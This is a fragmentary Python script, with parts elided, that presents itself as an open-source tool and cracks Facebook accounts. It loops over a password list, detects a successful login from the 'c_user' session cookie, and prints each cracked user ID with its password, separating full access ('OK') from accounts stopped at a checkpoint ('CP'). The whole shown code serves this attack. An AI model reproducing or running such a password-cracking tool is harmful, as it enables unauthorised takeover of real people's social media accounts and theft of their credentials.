...
'''
this is an open source program by 4AJIB (4AJIB)
...
def banner():
 ...
 |_|  \_\/_/    \_\____/|_____|____/ 
	...
	print("%s║%s  Github   : https://github.com/4AJIB  %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [4AJIB-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [4AJIB-CP] '+uidx+' | '+pasw+'\033[0;97m')
